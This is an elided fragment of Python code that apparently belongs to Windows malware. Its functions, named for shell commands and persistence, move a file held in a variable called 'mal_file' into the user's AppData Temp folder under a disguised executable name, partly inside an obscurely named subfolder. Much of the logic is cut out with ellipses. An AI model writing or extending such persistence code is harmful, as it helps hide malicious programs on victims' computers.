...
def shell_commands():
    shutil.move("" + mal_file + "","C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\($cript!).exe")
    time.sleep(0.5)
...
def persistence():
    if os.path.exists("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
        ...
        time.sleep(0.5)
    shutil.move("" + mal_file + "","C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\($cript!).exe")
    time.sleep(0.5)
